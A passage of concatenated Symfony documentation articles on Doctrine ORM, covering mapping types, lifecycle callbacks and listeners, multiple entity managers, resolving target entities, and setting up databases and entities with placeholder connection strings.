        <container xmlns="http://symfony.com/schema/dic/services"
            xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
            xmlns:doctrine="http://symfony.com/schema/dic/doctrine"
            xsi:schemaLocation="http://symfony.com/schema/dic/services
                https://symfony.com/schema/dic/services/services-1.0.xsd
                http://symfony.com/schema/dic/doctrine
                https://symfony.com/schema/dic/doctrine/doctrine-1.0.xsd">

            <doctrine:config>
                <doctrine:dbal>
                    <doctrine:mapping-type name="enum">string</doctrine:mapping-type>
                </doctrine:dbal>
            </doctrine:config>
        </container>

    .. code-block:: php

        // config/packages/doctrine.php
        use Symfony\Config\DoctrineConfig;

        return static function (DoctrineConfig $doctrine): void {
            $dbalDefault = $doctrine->dbal()
                ->connection('default');
            $dbalDefault->mappingType('enum', 'string');
        };

.. _`PDO`: https://www.php.net/pdo
.. _`Doctrine`: https://www.doctrine-project.org/
.. _`DBAL Documentation`: https://www.doctrine-project.org/projects/doctrine-dbal/en/latest/index.html
.. _`Custom Mapping Types`: https://www.doctrine-project.org/projects/doctrine-dbal/en/latest/reference/types.html#custom-mapping-types
Doctrine Events
===============

`Doctrine`_, the set of PHP libraries used by Symfony to work with databases,
provides a lightweight event system to update entities during the application
execution. These events, called `lifecycle events`_, allow to perform tasks such
as *"update the createdAt property automatically right before persisting entities
of this type"*.

Doctrine triggers events before/after performing the most common entity
operations (e.g. ``prePersist/postPersist``, ``preUpdate/postUpdate``) and also
on other common tasks (e.g. ``loadClassMetadata``, ``onClear``).

There are different ways to listen to these Doctrine events:

* **Lifecycle callbacks**, they are defined as public methods on the entity classes.
  They can't use services, so they are intended for **very simple logic** related
  to a single entity;
* **Entity listeners**, they are defined as classes with callback methods for the
  events you want to respond to. They can use services, but they are only called
  for the entities of a certain class, so they are ideal for **complex event logic
  related to a single entity**;
* **Lifecycle listeners**, they are similar to entity listeners but their event
  methods are called for all entities, not only those of a certain type. They are
  ideal to **share event logic between entities**.

The performance of each type of listener depends on how many entities applies to:
lifecycle callbacks are faster than entity listeners, which in turn are faster
than lifecycle listeners.

This article only explains the basics about Doctrine events when using them
inside a Symfony application. Read the `official docs about Doctrine events`_
to learn everything about them.

.. seealso::

    This article covers listeners for Doctrine ORM. If you are
    using ODM for MongoDB, read the `DoctrineMongoDBBundle documentation`_.

Doctrine Lifecycle Callbacks
----------------------------

Lifecycle callbacks are defined as public methods inside the entity you want to modify.
For example, suppose you want to set a ``createdAt`` date column to the current
date, but only when the entity is first persisted (i.e. inserted). To do so,
define a callback for the ``prePersist`` Doctrine event:

.. configuration-block::

    .. code-block:: php-attributes

        // src/Entity/Product.php
        namespace App\Entity;

        use Doctrine\ORM\Mapping as ORM;

        // When using attributes, don't forget to add #[ORM\HasLifecycleCallbacks]
        // to the class of the entity where you define the callback

        #[ORM\Entity]
        #[ORM\HasLifecycleCallbacks]
        class Product
        {
            // ...

            #[ORM\PrePersist]
            public function setCreatedAtValue(): void
            {
                $this->createdAt = new \DateTimeImmutable();
            }
        }

    .. code-block:: yaml

        # config/doctrine/Product.orm.yml
        App\Entity\Product:
            type: entity
            # ...
            lifecycleCallbacks:
                prePersist: ['setCreatedAtValue']

    .. code-block:: xml

        <!-- config/doctrine/Product.orm.xml -->
        <?xml version="1.0" encoding="UTF-8" ?>
        <doctrine-mapping xmlns="http://doctrine-project.org/schemas/orm/doctrine-mapping"
            xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
            xsi:schemaLocation="http://doctrine-project.org/schemas/orm/doctrine-mapping
                https://doctrine-project.org/schemas/orm/doctrine-mapping.xsd">

            <entity name="App\Entity\Product">
                <!-- ... -->
                <lifecycle-callbacks>
                    <lifecycle-callback type="prePersist" method="setCreatedAtValue"/>
                </lifecycle-callbacks>
            </entity>
        </doctrine-mapping>

.. note::

    Some lifecycle callbacks receive an argument that provides access to
    useful information such as the current entity manager (e.g. the ``preUpdate``
    callback receives a ``PreUpdateEventArgs $event`` argument).

Doctrine Entity Listeners
-------------------------

Entity listeners are defined as PHP classes that listen to a single Doctrine
event on a single entity class. For example, suppose that you want to send some
notifications whenever a ``User`` entity is modified in the database.

First, define a PHP class that handles the ``postUpdate`` Doctrine event::

    // src/EventListener/UserChangedNotifier.php
    namespace App\EventListener;

    use App\Entity\User;
    use Doctrine\ORM\Event\PostUpdateEventArgs;

    class UserChangedNotifier
    {
        // the entity listener methods receive two arguments:
        // the entity instance and the lifecycle event
        public function postUpdate(User $user, PostUpdateEventArgs $event): void
        {
            // ... do something to notify the changes
        }
    }

Then, add the ``#[AsEntityListener]`` attribute to the class to enable it as
a Doctrine entity listener in your application::

        // src/EventListener/UserChangedNotifier.php
        namespace App\EventListener;

        // ...
        use App\Entity\User;
        use Doctrine\Bundle\DoctrineBundle\Attribute\AsEntityListener;
        use Doctrine\ORM\Events;

        #[AsEntityListener(event: Events::postUpdate, method: 'postUpdate', entity: User::class)]
        class UserChangedNotifier
        {
            // ...
        }

Alternatively, if you prefer to not use PHP attributes, you must
configure a service for the entity listener and :doc:`tag it </service_container/tags>`
with the ``doctrine.orm.entity_listener`` tag as follows:

.. configuration-block::

    .. code-block:: yaml

        # config/services.yaml
        services:
            # ...

            App\EventListener\UserChangedNotifier:
                tags:
                    -
                        # these are the options required to define the entity listener
                        name: 'doctrine.orm.entity_listener'
                        event: 'postUpdate'
                        entity: 'App\Entity\User'

                        # these are other options that you may define if needed

                        # set the 'lazy' option to TRUE to only instantiate listeners when they are used
                        # lazy: true

                        # set the 'entity_manager' option if the listener is not associated to the default manager
                        # entity_manager: 'custom'

                        # by default, Symfony looks for a method called after the event (e.g. postUpdate())
                        # if it doesn't exist, it tries to execute the '__invoke()' method, but you can
                        # configure a custom method name with the 'method' option
                        # method: 'checkUserChanges'

    .. code-block:: xml

        <!-- config/services.xml -->
        <?xml version="1.0" encoding="UTF-8" ?>
        <container xmlns="http://symfony.com/schema/dic/services"
            xmlns:doctrine="http://symfony.com/schema/dic/doctrine">
            <services>
                <!-- ... -->

                <service id="App\EventListener\UserChangedNotifier">
                    <!--
                        * These are the options required to define the entity listener:
                        *   * name
                        *   * event
                        *   * entity
                        *
                        * These are other options that you may define if needed:
                        *   * lazy: if TRUE, listeners are only instantiated when they are used
                        *   * entity_manager: define it if the listener is not associated to the default manager
                        *   * method: by default, Symfony looks for a method called after the event (e.g. postUpdate())
                        *           if it doesn't exist, it tries to execute the '__invoke()' method, but
                        *           you can configure a custom method name with the 'method' option
                    -->
                    <tag name="doctrine.orm.entity_listener"
                        event="postUpdate"
                        entity="App\Entity\User"
                        lazy="true"
                        entity_manager="custom"
                        method="checkUserChanges"/>
                </service>
            </services>
        </container>

    .. code-block:: php

        // config/services.php
        namespace Symfony\Component\DependencyInjection\Loader\Configurator;

        use App\Entity\User;
        use App\EventListener\UserChangedNotifier;

        return static function (ContainerConfigurator $container): void {
            $services = $container->services();

            $services->set(UserChangedNotifier::class)
                ->tag('doctrine.orm.entity_listener', [
                    // These are the options required to define the entity listener:
                    'event' => 'postUpdate',
                    'entity' => User::class,

                    // These are other options that you may define if needed:

                    // set the 'lazy' option to TRUE to only instantiate listeners when they are used
                    // 'lazy' => true,

                    // set the 'entity_manager' option if the listener is not associated to the default manager
                    // 'entity_manager' => 'custom',

                    // by default, Symfony looks for a method called after the event (e.g. postUpdate())
                    // if it doesn't exist, it tries to execute the '__invoke()' method, but you can
                    // configure a custom method name with the 'method' option
                    // 'method' => 'checkUserChanges',
                ])
            ;
        };

.. _doctrine-lifecycle-listener:

Doctrine Lifecycle Listeners
----------------------------

Lifecycle listeners are defined as PHP classes that listen to a single Doctrine
event on all the application entities. For example, suppose that you want to
update some search index whenever a new entity is persisted in the database. To
do so, define a listener for the ``postPersist`` Doctrine event::

    // src/EventListener/SearchIndexer.php
    namespace App\EventListener;

    use App\Entity\Product;
    use Doctrine\ORM\Event\PostPersistEventArgs;

    class SearchIndexer
    {
        // the listener methods receive an argument which gives you access to
        // both the entity object of the event and the entity manager itself
        public function postPersist(PostPersistEventArgs $args): void
        {
            $entity = $args->getObject();

            // if this listener only applies to certain entity types,
            // add some code to check the entity type as early as possible
            if (!$entity instanceof Product) {
                return;
            }

            $entityManager = $args->getObjectManager();
            // ... do something with the Product entity
        }
    }

.. note::

    In previous Doctrine versions, instead of ``PostPersistEventArgs``, you had
    to use ``LifecycleEventArgs``, which was deprecated in Doctrine ORM 2.14.

Then, add the ``#[AsDoctrineListener]`` attribute to the class to enable it as
a Doctrine listener in your application::

        // src/EventListener/SearchIndexer.php
        namespace App\EventListener;

        use Doctrine\Bundle\DoctrineBundle\Attribute\AsDoctrineListener;
        use Doctrine\ORM\Events;

        #[AsDoctrineListener(event: Events::postPersist, priority: 500, connection: 'default')]
        class SearchIndexer
        {
            // ...
        }

Alternatively, if you prefer to not use PHP attributes, you must enable the
listener in the Symfony application by creating a new service for it and
:doc:`tagging it </service_container/tags>` with the ``doctrine.event_listener`` tag:

.. configuration-block::

    .. code-block:: php-attributes

        // src/EventListener/SearchIndexer.php
        namespace App\EventListener;

        use Doctrine\Bundle\DoctrineBundle\Attribute\AsDoctrineListener;
        use Doctrine\ORM\Event\PostPersistEventArgs;

        #[AsDoctrineListener('postPersist'/*, 500, 'default'*/)]
        class SearchIndexer
        {
            public function postPersist(PostPersistEventArgs $event): void
            {
                // ...
            }
        }

    .. code-block:: yaml

        # config/services.yaml
        services:
            # ...

            App\EventListener\SearchIndexer:
                tags:
                    -
                        name: 'doctrine.event_listener'
                        # this is the only required option for the lifecycle listener tag
                        event: 'postPersist'

                        # listeners can define their priority in case listeners are associated
                        # to the same event (default priority = 0; higher numbers = listener is run earlier)
                        priority: 500

                        # you can also restrict listeners to a specific Doctrine connection
                        connection: 'default'

    .. code-block:: xml

        <!-- config/services.xml -->
        <?xml version="1.0" encoding="UTF-8" ?>
        <container xmlns="http://symfony.com/schema/dic/services"
            xmlns:doctrine="http://symfony.com/schema/dic/doctrine">
            <services>
                <!-- ... -->

                <!--
                    * 'event' is the only required option that defines the lifecycle listener
                    * 'priority': used when multiple listeners are associated to the same event
                    *             (default priority = 0; higher numbers = listener is run earlier)
                    * 'connection': restricts the listener to a specific Doctrine connection
                -->
                <service id="App\EventListener\SearchIndexer">
                    <tag name="doctrine.event_listener"
                        event="postPersist"
                        priority="500"
                        connection="default"/>
                </service>
            </services>
        </container>

    .. code-block:: php

        // config/services.php
        namespace Symfony\Component\DependencyInjection\Loader\Configurator;

        use App\EventListener\SearchIndexer;

        return static function (ContainerConfigurator $container): void {
            $services = $container->services();

            // listeners are applied by default to all Doctrine connections
            $services->set(SearchIndexer::class)
                ->tag('doctrine.event_listener', [
                    // this is the only required option for the lifecycle listener tag
                    'event' => 'postPersist',

                    // listeners can define their priority in case multiple listeners are associated
                    // to the same event (default priority = 0; higher numbers = listener is run earlier)
                    'priority' => 500,

                    # you can also restrict listeners to a specific Doctrine connection
                    'connection' => 'default',
                ])
            ;
        };

.. versionadded:: 2.7.2

    The `AsDoctrineListener`_ attribute was introduced in DoctrineBundle 2.7.2.

.. tip::

    The value of the ``connection`` option can also be a
    :ref:`configuration parameter <configuration-parameters>`.

.. _`Doctrine`: https://www.doctrine-project.org/
.. _`lifecycle events`: https://www.doctrine-project.org/projects/doctrine-orm/en/current/reference/events.html#lifecycle-events
.. _`official docs about Doctrine events`: https://www.doctrine-project.org/projects/doctrine-orm/en/current/reference/events.html
.. _`DoctrineMongoDBBundle documentation`: https://symfony.com/doc/current/bundles/DoctrineMongoDBBundle/index.html
.. _`AsDoctrineListener`: https://github.com/doctrine/DoctrineBundle/blob/2.10.x/Attribute/AsDoctrineListener.php
How to Work with Multiple Entity Managers and Connections
=========================================================

You can use multiple Doctrine entity managers or connections in a Symfony
application. This is necessary if you are using different databases or even
vendors with entirely different sets of entities. In other words, one entity
manager that connects to one database will handle some entities while another
entity manager that connects to another database might handle the rest.
It is also possible to use multiple entity managers to manage a common set of
entities, each with their own database connection strings or separate cache configuration.

.. note::

    Using multiple entity managers is not complicated to configure, but more
    advanced and not usually required. Be sure you actually need multiple
    entity managers before adding in this layer of complexity.

.. caution::

    Entities cannot define associations across different entity managers. If you
    need that, there are `several alternatives`_ that require some custom setup.

The following configuration code shows how you can configure two entity managers:

.. configuration-block::

    .. code-block:: yaml

        # config/packages/doctrine.yaml
        doctrine:
            dbal:
                connections:
                    default:
                        url: '%env(resolve:DATABASE_URL)%'
                    customer:
                        url: '%env(resolve:CUSTOMER_DATABASE_URL)%'
                default_connection: default
            orm:
                default_entity_manager: default
                entity_managers:
                    default:
                        connection: default
                        mappings:
                            Main:
                                is_bundle: false
                                dir: '%kernel.project_dir%/src/Entity/Main'
                                prefix: 'App\Entity\Main'
                                alias: Main
                    customer:
                        connection: customer
                        mappings:
                            Customer:
                                is_bundle: false
                                dir: '%kernel.project_dir%/src/Entity/Customer'
                                prefix: 'App\Entity\Customer'
                                alias: Customer

    .. code-block:: xml

        <!-- config/packages/doctrine.xml -->
        <?xml version="1.0" encoding="UTF-8" ?>
        <container xmlns="http://symfony.com/schema/dic/services"
            xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
            xmlns:doctrine="http://symfony.com/schema/dic/doctrine"
            xsi:schemaLocation="http://symfony.com/schema/dic/services
                https://symfony.com/schema/dic/services/services-1.0.xsd
                http://symfony.com/schema/dic/doctrine
                https://symfony.com/schema/dic/doctrine/doctrine-1.0.xsd">

            <doctrine:config>
                <doctrine:dbal default-connection="default">
                    <doctrine:connection name="default"
                        url="%env(resolve:DATABASE_URL)%"
                    />

                    <doctrine:connection name="customer"
                        url="%env(resolve:CUSTOMER_DATABASE_URL)%"
                    />
                </doctrine:dbal>

                <doctrine:orm default-entity-manager="default">
                    <doctrine:entity-manager name="default" connection="default">
                        <doctrine:mapping
                            name="Main"
                            is_bundle="false"
                            dir="%kernel.project_dir%/src/Entity/Main"
                            prefix="App\Entity\Main"
                            alias="Main"
                        />
                    </doctrine:entity-manager>

                    <doctrine:entity-manager name="customer" connection="customer">
                        <doctrine:mapping
                            name="Customer"
                            is_bundle="false"
                            dir="%kernel.project_dir%/src/Entity/Customer"
                            prefix="App\Entity\Customer"
                            alias="Customer"
                        />
                    </doctrine:entity-manager>
                </doctrine:orm>
            </doctrine:config>
        </container>

    .. code-block:: php

        // config/packages/doctrine.php
        use Symfony\Config\DoctrineConfig;

        return static function (DoctrineConfig $doctrine): void {
            // Connections:
            $doctrine->dbal()
                ->connection('default')
                ->url(env('DATABASE_URL')->resolve());
            $doctrine->dbal()
                ->connection('customer')
                ->url(env('CUSTOMER_DATABASE_URL')->resolve());
            $doctrine->dbal()->defaultConnection('default');

            // Entity Managers:
            $doctrine->orm()->defaultEntityManager('default');
            $defaultEntityManager = $doctrine->orm()->entityManager('default');
            $defaultEntityManager->connection('default');
            $defaultEntityManager->mapping('Main')
                ->isBundle(false)
                ->dir('%kernel.project_dir%/src/Entity/Main')
                ->prefix('App\Entity\Main')
                ->alias('Main');
            $customerEntityManager = $doctrine->orm()->entityManager('customer');
            $customerEntityManager->connection('customer');
            $customerEntityManager->mapping('Customer')
                ->isBundle(false)
                ->dir('%kernel.project_dir%/src/Entity/Customer')
                ->prefix('App\Entity\Customer')
                ->alias('Customer')
            ;
        };

In this case, you've defined two entity managers and called them ``default``
and ``customer``. The ``default`` entity manager manages entities in the
``src/Entity/Main`` directory, while the ``customer`` entity manager manages
entities in ``src/Entity/Customer``. You've also defined two connections, one
for each entity manager, but you are free to define the same connection for both.

.. caution::

    When working with multiple connections and entity managers, you should be
    explicit about which configuration you want. If you *do* omit the name of
    the connection or entity manager, the default (i.e. ``default``) is used.

    If you use a different name than ``default`` for the default entity manager,
    you will need to redefine the default entity manager in the ``prod`` environment
    configuration and in the Doctrine migrations configuration (if you use that):

    .. code-block:: yaml

        # config/packages/prod/doctrine.yaml
        doctrine:
            orm:
                default_entity_manager: 'your default entity manager name'

        # ...

    .. code-block:: yaml

        # config/packages/doctrine_migrations.yaml
        doctrine_migrations:
            # ...
            em: 'your default entity manager name'

When working with multiple connections to create your databases:

.. code-block:: terminal

    # Play only with "default" connection
    $ php bin/console doctrine:database:create

    # Play only with "customer" connection
    $ php bin/console doctrine:database:create --connection=customer

When working with multiple entity managers to generate migrations:

.. code-block:: terminal

    # Play only with "default" mappings
    $ php bin/console doctrine:migrations:diff
    $ php bin/console doctrine:migrations:migrate

    # Play only with "customer" mappings
    $ php bin/console doctrine:migrations:diff --em=customer
    $ php bin/console doctrine:migrations:migrate --em=customer

If you *do* omit the entity manager's name when asking for it,
the default entity manager (i.e. ``default``) is returned::

    // src/Controller/UserController.php
    namespace App\Controller;

    // ...
    use Doctrine\ORM\EntityManagerInterface;
    use Doctrine\Persistence\ManagerRegistry;

    class UserController extends AbstractController
    {
        public function index(ManagerRegistry $doctrine): Response
        {
            // Both methods return the default entity manager
            $entityManager = $doctrine->getManager();
            $entityManager = $doctrine->getManager('default');

            // This method returns instead the "customer" entity manager
            $customerEntityManager = $doctrine->getManager('customer');

            // ...
        }
    }

Entity managers also benefit from :ref:`autowiring aliases <service-autowiring-alias>`
when the :doc:`framework bundle </reference/configuration/framework>` is used. For
example, to inject the ``customer`` entity manager, type-hint your method with
``EntityManagerInterface $customerEntityManager``.

You can now use Doctrine like you did before - using the ``default`` entity
manager to persist and fetch entities that it manages and the ``customer``
entity manager to persist and fetch its entities.

The same applies to repository calls::

    // src/Controller/UserController.php
    namespace App\Controller;

    use AcmeStoreBundle\Entity\Customer;
    use AcmeStoreBundle\Entity\Product;
    use Doctrine\Persistence\ManagerRegistry;
    // ...

    class UserController extends AbstractController
    {
        public function index(ManagerRegistry $doctrine): Response
        {
            // Retrieves a repository managed by the "default" entity manager
            $products = $doctrine->getRepository(Product::class)->findAll();

            // Explicit way to deal with the "default" entity manager
            $products = $doctrine->getRepository(Product::class, 'default')->findAll();

            // Retrieves a repository managed by the "customer" entity manager
            $customers = $doctrine->getRepository(Customer::class, 'customer')->findAll();

            // ...
        }
    }

.. caution::

    One entity can be managed by more than one entity manager. This however
    results in unexpected behavior when extending from ``ServiceEntityRepository``
    in your custom repository. The ``ServiceEntityRepository`` always
    uses the configured entity manager for that entity.

    In order to fix this situation, extend ``EntityRepository`` instead and
    no longer rely on autowiring::

        // src/Repository/CustomerRepository.php
        namespace App\Repository;

        use Doctrine\ORM\EntityRepository;

        class CustomerRepository extends EntityRepository
        {
            // ...
        }

    You should now always fetch this repository using ``ManagerRegistry::getRepository()``.

.. _`several alternatives`: https://stackoverflow.com/a/11494543
How to Implement a Registration Form
====================================

This article has been removed because it only explained things that are
already explained in other articles. Specifically, to implement a registration
form you must:

#. :ref:`Define a class to represent users <create-user-class>`;
#. :doc:`Create a form </forms>` to ask for the registration information (you can
   generate this with the ``make:registration-form`` command provided by the `MakerBundle`_);
#. Create :doc:`a controller </controller>` to :ref:`process the form <processing-forms>`;
#. :ref:`Protect some parts of your application <security-access-control>` so that
   only registered users can access to them.

.. _`MakerBundle`: https://symfony.com/doc/current/bundles/SymfonyMakerBundle/index.html
How to Define Relationships with Abstract Classes and Interfaces
================================================================

One of the goals of bundles is to create discrete bundles of functionality
that do not have many (if any) dependencies, allowing you to use that
functionality in other applications without including unnecessary items.

Doctrine 2.2 includes a new utility called the ``ResolveTargetEntityListener``,
that functions by intercepting certain calls inside Doctrine and rewriting
``targetEntity`` parameters in your metadata mapping at runtime. It means that
in your bundle you are able to use an interface or abstract class in your
mappings and expect correct mapping to a concrete entity at runtime.

This functionality allows you to define relationships between different entities
without making them hard dependencies.

Background
----------

Suppose you have an InvoiceBundle which provides invoicing functionality
and a CustomerBundle that contains customer management tools. You want
to keep these separated, because they can be used in other systems without
each other, but for your application you want to use them together.

In this case, you have an ``Invoice`` entity with a relationship to a
non-existent object, an ``InvoiceSubjectInterface``. The goal is to get
the ``ResolveTargetEntityListener`` to replace any mention of the interface
with a real object that implements that interface.

Set up
------

This article uses the following two basic entities (which are incomplete for
brevity) to explain how to set up and use the ``ResolveTargetEntityListener``.

A Customer entity::

    // src/Entity/Customer.php
    namespace App\Entity;

    use App\Entity\CustomerInterface as BaseCustomer;
    use App\Model\InvoiceSubjectInterface;
    use Doctrine\ORM\Mapping as ORM;

    #[ORM\Entity]
    #[ORM\Table(name: 'customer')]
    class Customer extends BaseCustomer implements InvoiceSubjectInterface
    {
        // In this example, any methods defined in the InvoiceSubjectInterface
        // are already implemented in the BaseCustomer
    }

An Invoice entity::

    // src/Entity/Invoice.php
    namespace App\Entity;

    use App\Model\InvoiceSubjectInterface;
    use Doctrine\ORM\Mapping as ORM;

    /**
     * Represents an Invoice.
     */
    #[ORM\Entity]
    #[ORM\Table(name: 'invoice')]
    class Invoice
    {
        #[ORM\ManyToOne(targetEntity: InvoiceSubjectInterface::class)]
        protected InvoiceSubjectInterface $subject;
    }

An InvoiceSubjectInterface::

    // src/Model/InvoiceSubjectInterface.php
    namespace App\Model;

    /**
     * An interface that the invoice Subject object should implement.
     * In most circumstances, only a single object should implement
     * this interface as the ResolveTargetEntityListener can only
     * change the target to a single object.
     */
    interface InvoiceSubjectInterface
    {
        // List any additional methods that your InvoiceBundle
        // will need to access on the subject so that you can
        // be sure that you have access to those methods.

        public function getName(): string;
    }

Next, you need to configure the listener, which tells the DoctrineBundle
about the replacement:

.. configuration-block::

    .. code-block:: yaml

        # config/packages/doctrine.yaml
        doctrine:
            # ...
            orm:
                # ...
                resolve_target_entities:
                    App\Model\InvoiceSubjectInterface: App\Entity\Customer

    .. code-block:: xml

        <!-- config/packages/doctrine.xml -->
        <?xml version="1.0" encoding="UTF-8" ?>
        <container xmlns="http://symfony.com/schema/dic/services"
            xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
            xmlns:doctrine="http://symfony.com/schema/dic/doctrine"
            xsi:schemaLocation="http://symfony.com/schema/dic/services
                https://symfony.com/schema/dic/services/services-1.0.xsd
                http://symfony.com/schema/dic/doctrine
                https://symfony.com/schema/dic/doctrine/doctrine-1.0.xsd">

            <doctrine:config>
                <doctrine:orm>
                    <!-- ... -->
                    <doctrine:resolve-target-entity interface="App\Model\InvoiceSubjectInterface">App\Entity\Customer</doctrine:resolve-target-entity>
                </doctrine:orm>
            </doctrine:config>
        </container>

    .. code-block:: php

        // config/packages/doctrine.php
        use App\Entity\Customer;
        use App\Model\InvoiceSubjectInterface;
        use Symfony\Config\DoctrineConfig;

        return static function (DoctrineConfig $doctrine): void {
            $orm = $doctrine->orm();
            // ...
            $orm->resolveTargetEntity(InvoiceSubjectInterface::class, Customer::class);
        };

Final Thoughts
--------------

With the ``ResolveTargetEntityListener``, you are able to decouple your
bundles, keeping them usable by themselves, but still being able to
define relationships between different objects. By using this method,
your bundles will end up being easier to maintain independently.
How to Generate Entities from an Existing Database
==================================================

.. caution::

    The ``doctrine:mapping:import`` command used to generate Doctrine entities
    from existing databases was deprecated by Doctrine in 2019 and there's no
    replacement for it.

    Instead, you can use the ``make:entity`` command from `Symfony Maker Bundle`_
    to help you generate the code of your Doctrine entities. This command
    requires manual supervision because it doesn't generate entities from
    existing databases.

.. _`Symfony Maker Bundle`: https://symfony.com/bundles/SymfonyMakerBundle/current/index.html
Databases and the Doctrine ORM
==============================

.. admonition:: Screencast
    :class: screencast

    Do you prefer video tutorials? Check out the `Doctrine screencast series`_.

Symfony provides all the tools you need to use databases in your applications
thanks to `Doctrine`_, the best set of PHP libraries to work with databases.
These tools support relational databases like MySQL and PostgreSQL and also
NoSQL databases like MongoDB.

Databases are a broad topic, so the documentation is divided in three articles:

* This article explains the recommended way to work with **relational databases**
  in Symfony applications;
* Read :doc:`this other article </doctrine/dbal>` if you need **low-level access**
  to perform raw SQL queries to relational databases (similar to PHP's `PDO`_);
* Read `DoctrineMongoDBBundle docs`_ if you are working with **MongoDB databases**.

Installing Doctrine
-------------------

First, install Doctrine support via the ``orm`` :ref:`Symfony pack <symfony-packs>`,
as well as the MakerBundle, which will help generate some code:

.. code-block:: terminal

    $ composer require symfony/orm-pack
    $ composer require --dev symfony/maker-bundle

Configuring the Database
~~~~~~~~~~~~~~~~~~~~~~~~

The database connection information is stored as an environment variable called
``DATABASE_URL``. For development, you can find and customize this inside ``.env``:

.. code-block:: text

    # .env (or override DATABASE_URL in .env.local to avoid committing your changes)

    # customize this line!
    DATABASE_URL="mysql://db_user:db_password@127.0.0.1:3306/db_name?serverVersion=5.7"

    # to use mariadb:
    # Before doctrine/dbal < 3.7
    # DATABASE_URL="mysql://db_user:db_password@127.0.0.1:3306/db_name?serverVersion=mariadb-10.5.8"
    # Since doctrine/dbal 3.7
    # DATABASE_URL="mysql://db_user:db_password@127.0.0.1:3306/db_name?serverVersion=10.5.8-MariaDB"

    # to use sqlite:
    # DATABASE_URL="sqlite:///%kernel.project_dir%/var/app.db"

    # to use postgresql:
    # DATABASE_URL="postgresql://db_user:db_password@127.0.0.1:5432/db_name?serverVersion=11&charset=utf8"

    # to use oracle:
    # DATABASE_URL="oci8://db_user:db_password@127.0.0.1:1521/db_name"

.. caution::

    If the username, password, host or database name contain any character considered
    special in a URI (such as ``: / ? # [ ] @ ! $ & ' ( ) * + , ; =``),
    you must encode them. See `RFC 3986`_ for the full list of reserved characters.
    You can use the :phpfunction:`urlencode` function to encode them or
    the :ref:`urlencode environment variable processor <urlencode_environment_variable_processor>`.
    In this case you need to remove the ``resolve:`` prefix in ``config/packages/doctrine.yaml``
    to avoid errors: ``url: '%env(DATABASE_URL)%'``

Now that your connection parameters are setup, Doctrine can create the ``db_name``
database for you:

.. code-block:: terminal

    $ php bin/console doctrine:database:create

There are more options in ``config/packages/doctrine.yaml`` that you can configure,
including your ``server_version`` (e.g. 5.7 if you're using MySQL 5.7), which may
affect how Doctrine functions.

.. tip::

    There are many other Doctrine commands. Run ``php bin/console list doctrine``
    to see a full list.

Creating an Entity Class
------------------------

Suppose you're building an application where products need to be displayed.
Without even thinking about Doctrine or databases, you already know that
you need a ``Product`` object to represent those products.

.. _doctrine-adding-mapping:

You can use the ``make:entity`` command to create this class and any fields you
need. The command will ask you some questions - answer them like done below:

.. code-block:: bash

    $ php bin/console make:entity

    Class name of the entity to create or update:
    > Product

    New property name (press <return> to stop adding fields):
    > name

    Field type (enter ? to see all types) [string]:
    > string

    Field length [255]:
    > 255

    Can this field be null in the database (nullable) (yes/no) [no]:
    > no

    New property name (press <return> to stop adding fields):
    > price

    Field type (enter ? to see all types) [string]:
    > integer

    Can this field be null in the database (nullable) (yes/no) [no]:
    > no

    New property name (press <return> to stop adding fields):
    >
    (press enter again to finish)

Whoa! You now have a new ``src/Entity/Product.php`` file::

    // src/Entity/Product.php
    namespace App\Entity;

    use App\Repository\ProductRepository;
    use Doctrine\ORM\Mapping as ORM;

    #[ORM\Entity(repositoryClass: ProductRepository::class)]
    class Product
    {
        #[ORM\Id]
        #[ORM\GeneratedValue]
        #[ORM\Column]
        private ?int $id = null;

        #[ORM\Column(length: 255)]
        private ?string $name = null;

        #[ORM\Column]
        private ?int $price = null;

        public function getId(): ?int
        {
            return $this->id;
        }

        // ... getter and setter methods
    }

.. tip::

    Starting in `MakerBundle`_: v1.57.0 - You can pass either ``--with-uuid`` or
    ``--with-ulid`` to ``make:entity``. Leveraging Symfony's :doc:`Uid Component </components/uid>`,
    this generates an entity with the ``id`` type as :ref:`Uuid <uuid>`
    or :ref:`Ulid <ulid>` instead of ``int``.

.. note::

    Starting in v1.44.0 - `MakerBundle`_: only supports entities using PHP attributes.

.. note::

    Confused why the price is an integer? Don't worry: this is just an example.
    But, storing prices as integers (e.g. 100 = $1 USD) can avoid rounding issues.

.. note::

    If you are using an SQLite database, you'll see the following error:
    *PDOException: SQLSTATE[HY000]: General error: 1 Cannot add a NOT NULL
    column with default value NULL*. Add a ``nullable=true`` option to the
    ``description`` property to fix the problem.

.. caution::

    There is a `limit of 767 bytes for the index key prefix`_ when using
    InnoDB tables in MySQL 5.6 and earlier versions. String columns with 255
    character length and ``utf8mb4`` encoding surpass that limit. This means
    that any column of type ``string`` and ``unique=true`` must set its
    maximum ``length`` to ``190``. Otherwise, you'll see this error:
    *"[PDOException] SQLSTATE[42000]: Syntax error or access violation:
    1071 Specified key was too long; max key length is 767 bytes"*.

This class is called an "entity". And soon, you'll be able to save and query Product
objects to a ``product`` table in your database. Each property in the ``Product``
entity can be mapped to a column in that table. This is usually done with attributes:
the ``#[ORM\Column(...)]`` comments that you see above each property:

.. raw:: html

    <object data="_images/doctrine/mapping_single_entity.svg" type="image/svg+xml"
        alt="Doctrine mapping between properties of a Product PHP object and the data in the product database table"
    ></object>

The ``make:entity`` command is a tool to make life easier. But this is *your* code:
add/remove fields, add/remove methods or update configuration.

Doctrine supports a wide variety of field types, each with their own options.
Check out the `list of Doctrine mapping types`_ in the Doctrine documentation.
If you want to use XML instead of attributes, add ``type: xml`` and
``dir: '%kernel.project_dir%/config/doctrine'`` to the entity mappings in your
``config/packages/doctrine.yaml`` file.

.. caution::

    Be careful not to use reserved SQL keywords as your table or column names
    (e.g. ``GROUP`` or ``USER``). See Doctrine's `Reserved SQL keywords documentation`_
    for details on how to escape these. Or, change the table name with
    ``#[ORM\Table(name: 'groups')]`` above the class or configure the column name with
    the ``name: 'group_name'`` option.

.. _doctrine-creating-the-database-tables-schema:

Migrations: Creating the Database Tables/Schema
-----------------------------------------------

The ``Product`` class is fully-configured and ready to save to a ``product`` table.
If you just defined this class, your database doesn't actually have the ``product``
table yet. To add it, you can leverage the `DoctrineMigrationsBundle`_, which is
already installed:

.. code-block:: terminal

    $ php bin/console make:migration

.. tip::

    Starting in `MakerBundle`_: v1.56.0 - Passing ``--formatted`` to ``make:migration``
    generates a nice and tidy migration file.

If everything worked, you should see something like this:

.. code-block:: text

    SUCCESS!

